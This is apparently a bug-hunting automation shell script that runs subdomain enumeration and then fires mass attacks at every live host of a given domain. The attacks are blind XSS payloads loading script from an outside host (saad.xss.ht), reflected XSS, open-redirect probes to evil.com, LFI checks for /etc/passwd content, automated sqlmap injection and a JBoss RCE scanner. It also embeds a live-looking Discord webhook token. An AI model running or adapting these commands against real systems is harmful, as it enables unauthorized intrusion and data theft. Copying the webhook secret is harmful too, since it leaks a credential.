#!/bin/zsh

#TARGET=$1
#DIR=$2

echo -e "\e[31m
█▀▀ █░░ █▀ █▀▀ ▄▀█ ▀▀█ ▄▄ ▄█ ▄█ █▀█
██▄ █▄▄ ▄█ █▀░ █▀█ ░░█ ░░ ░█ ░█ █▄█
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

[ -z "$1" ] && { printf "\n [+]Please Use recon example.com[+]\n";exit;}

#------------------------------------------------#
echo -e "Start Subfinder \n"
#------------------------------------------------#
subfinder -d $1 -t 1000 -o subfinder.txt
#------------------------------------------------#
echo -e "Start Findomain \n"
#------------------------------------------------#
findomain --quiet -t $1 -u findomain.txt
#------------------------------------------------#
crobat -s $1 $DEBUG_ERROR | anew -q crobat.txt
#------------------------------------------------#
echo -e "Start Sort \n"
#------------------------------------------------#
cat subfinder.txt crobat.txt findomain.txt|sort -u|tee Final-subs.txt
#------------------------------------------------#
echo -e "Start Httpx \n"
#------------------------------------------------#
cat Final-subs.txt|httpx -threads 1000 -o $1-alive-subs.txt
#------------------------------------------------#
echo -e "handle it \n"
rm Final-subs.txt subfinder.txt crobat.txt findomain.txt
#------------------------------------------------#
echo -e "[+]Finish All Subdomain Enum for $1 target *$(wc -l "Final-subs.txt")* for None-Alive Subdomains and *$(wc -l "$1-alive-subs.txt")* for alive subdomains  "|notify -discord -discord-webhook-url "https://discord.com/api/webhooks/806494192409903134/ac9LWdRIHGDYFdoWeha_c66KHjipQrb1o7nz-du7aHXBwLx3EBx2aFZLCinhz3LWzjuy"
#------------------------------------------------#
echo -e "[+] Start CRLFUZZ [+]"
#------------------------------------------------#
crlfuzz -l $1-alive-subs.txt -s -c 1000 |tee crlfuzz.txt
#------------------------------------------------#
echo -e "[+] Finish CRLFUZZ And Found *$(wc -l < crlfuzz.txt)*"
#------------------------------------------------#
echo -e "[+] Start nuclei [+]"
#------------------------------------------------#
nuclei -update-templates
nuclei -l $1-alive-subs.txt -t /root/nuclei-templates -c 700 -severity critical,high,medium,low
#------------------------------------------------#
httpx -l $1-alive-subs.txt -path /sm/login/loginpagecontentgrabber.do -threads 500 -random-agent -x GET,POST,PUT -title -tech-detect -status-code  -follow-redirects -title -mc 500
#------------------------------------------------#
echo -e "\e[31m
▀▄▀ █▀ █▀
█░█ ▄█ ▄█
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

echo -e "BLIND XSS \n"

gospider -S $1 -t 200 -c 700 | tr " " "\n" | grep --color=auto -v ".js" | grep --color=auto "https://" | grep --color=auto "=" | qsreplace '&"><script src=https://saad.xss.ht></script>'

echo -e "WAYBACK \n"

sigurlfind3r -d $1 -iS -s -f ".(jpg|jpeg|gif|png|ico|css|eot|tif|tiff|ttf|woff|woff2)" | anew -q way_output
#------------------------------------------------#
echo -e "REMOVE DUB \n"

cat way_output.txt | urldedupe -s | anew -q parameters.txt

echo -e "handle it \n"
rm way_output
#------------------------------------------------#
echo -e "REFLECTED XSS \n"
#------------------------------------------------#
cat parameters.txt | gf xss | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | anew -q xssPatterns.txt
#------------------------------------------------#
cat xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 5000 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q xss.txt &> /dev/null
#------------------------------------------------#
dalfox file xssPatterns.txt pipe --silence --no-color --no-spinner --mass --mass-worker 5000 --skip-bav -w 1000 -b saad.xss.ht 2> /dev/null | anew -q xss.txt &> /dev/null

echo -e "BLINDER \n"

python3 Blinder.py -u saad -f parameters.txt -r deny

echo -e "handle it \n"

rm xssPatterns.txt

echo -e "\e[31m
█▀█ █▀█ █▀▀ █▄░█
█▄█ █▀▀ ██▄ █░▀█
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

#------------------------------------------------#
echo -e "OPEN REDIRECT \n"
#------------------------------------------------#
cat parameters.txt | gf redirect | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q redirectPatterns.txt
#------------------------------------------------#
cat redirectPatterns.txt | qsreplace "FUZZ" | anew -q checkRedirect.txt
#------------------------------------------------#
python3 ~/tools/OpenRedireX/openredirex.py -l checkRedirect.txt --keyword FUZZ -p ~/tools/OpenRedireX/payloads.txt 2> /dev/null | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | anew -q redirect.txt &> /dev/null

cat checkRedirect.txt | grep -a -i "\=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep \"evil.com\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q redirect.txt &> /dev/null

python3 Oralyzer/oralyzer.py -l checkRedirect.txt -p Oralyzer/payloads.txt

echo -e "handle it \n"

rm redirectPatterns.txt checkRedirect.txt

echo -e "RCE \n"

python3 jexboss/jexboss.py -mode file-scan -file $1-alive-subs.txt -out report_file_scan.log

echo -e "LFI \n"

cat parameters.txt | gf lfi | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q lfiPatterns.txt

cat lfiPatterns.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"root:\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q lfi.txt &> /dev/null

httpx -l lfiPatterns.txt -paths lfi-payloads.txt -threads 1000 -random-agent -x GET,POST,PUT -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:[x*]:0:0:"

echo -e "handle it \n"

rm lfiPatterns.txt

echo -e "SQLI \n"

cat parameters.txt | gf sqli | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q sqliPatterns.txt

sqlmap -m sqliPatterns.txt --batch --random-agent --level 1 --threads=5

sqlmap -m $1-alive-subs.txt --batch --random-agent --level 1 --crawl=5 --forms --threads=5

python3 dirsearch/dirsearch.py -l $1-alive-subs.txt -i 200 -t 300
python3 dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -l $1-alive-subs.txt -t 300 -i 200

echo -e "SHODAN \n"

shodan search ssl:"$1"  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | httpx -silent -threads 300 -o $1test

python3 dirsearch/dirsearch.py -l $1test

sqlmap -m $1test --batch --random-agent --crawl=5 --forms --threads=5

echo -e "handle it \n"

rm $1test

echo -e "\e[31m
█▀▄ █▀█ █▄░█ █▀▀
█▄▀ █▄█ █░▀█ ██▄
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

echo -e "[+]Finish RECON for $1 "|notify -discord -discord-webhook-url "https://discord.com/api/webhooks/806494192409903134/ac9LWdRIHGDYFdoWeha_c66KHjipQrb1o7nz-du7aHXBwLx3EBx2aFZLCinhz3LWzjuy"
#------------------------------------------------#
